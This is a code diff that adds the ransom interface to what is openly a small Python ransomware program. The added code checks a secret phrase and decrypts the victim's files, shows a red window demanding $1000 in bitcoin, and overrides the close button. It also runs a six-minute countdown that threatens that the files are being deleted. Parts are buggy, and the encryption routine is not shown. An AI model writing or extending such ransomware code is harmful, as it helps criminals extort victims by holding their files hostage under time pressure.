@@ -116,11 +116,28 @@ def decrypt (user_phrase):
             # Write the changes t the file
             with open(file,"wb") as newFile:
                 newFile.write(decrypted_content)
+            return True
+    else:
+        return False
 
 
 # Submit function
+def Submit():
+    user_phrase=input.get().strip()
+    if not user_phrase:
+        messagebox.showwarning("Input required", "You must enter the secret phrase to continue")
+        return
 
-# On close funcyion
+    done=decrypt(user_phrase)
+
+    if not done:
+        messagebox.showerror("Incorrect secret phrase", "TYou entered the wrong phrase. Two trials remaining.")
+    else:
+        messagebox.showinfo("Congrats!", "Your files have been decrypted.")
+        
+
+
+# On close function
 
 # Read files
 def relativePath(relative_path):
@@ -136,6 +153,7 @@ image_path=relativePath("images.png")
 
 # We call the encryption function
 
+
 # User interface
 root=tk.Tk()
 root.title("Your files are encrypted")
@@ -146,6 +164,9 @@ root.config(bg="#cc0000")
 # Icon image
 icon =tk.PhotoImage(file=relativePath("images.png"))
 root.iconphoto(True, icon)
+
+# Overwrite the close button
+root.protocol("WM_DELETE_WINDOW",onclose)
 
 #Resize sizeof window
 window_width=400
@@ -166,6 +187,83 @@ title=tk.Label(
     fg="white",
 )
 title.pack(pady=5)
- 
+
+# Add an image here
+try:
+    image=-Image.open(relativePath("images.png"))
+    image=image.resize((100, 100))
+    lock_img=ImageTk.PhotoImage(image)
+    image_label=tk.Label(root,image=lock_img, bg="#cc0000")
+    image_label.pack(pady=(15,5))
+except Exception:
+    pass
+
+
+title2=tk.Label(
+    text="Pay $1000 to our bitcoin wallet 223323434 to get the secret phrase to decrypt them \n before time runs out",
+    font=("Arial", 13, "bold"),
+    bg="#cc0000",
+    fg="white",
+    justify="center",
+)
+title2.pack(pady=10)
+
+
+msg=tk.Label(
+    text="Enter the secret phrase",
+    font=("Arial", 13, "bold"),
+    bg="#cc0000",
+    fg="white",
+    justify="center",
+)
+msg.pack(pady=5)
+
+
+input = tk.Entry(root,width=30,font=("Arial", 14),   )
+input.pack(pady=15)
+input.pack(padx=30)
+input.focus()
+
+
+# Submit button
+submit_btn=tk.Button(
+    root,
+    text="Submit",
+    font=("Arial", 12, "bold"),
+    width=15,
+    bg="white",
+    fg="#cc0000",
+    command=Submit,
+)
+submit_btn.pack(pady=10)
+
+# A timer comes
+time_left=360
+def updateTimer():
+    global time_left
+    minutes=time_left//60
+    seconds=time_left%60
+
+    timer_label.config(text=f"{minutes:02d}:{seconds:02d} left")
+    if time_left > 0:
+        time_left -=1
+        root.after(1000, updateTimer)
+    else:
+        messagebox.showerror("Time expired !", "Your files are autodeleting")
+        root.destroy()
+
+minutes=time_left//60
+seconds=time_left%60
+timer_label=tk.Label(
+    root,
+    text=f"{minutes}:{seconds:02d} left",
+    font=("Arial", 12, "bold"),
+)
+timer_label.pack(pady=5)
+timer_label.config(text=f"{minutes:02d}:{seconds:02d} left")
+
+root.after(1000, updateTimer)
+
+
 # Show tha dialog
 root.mainloop()
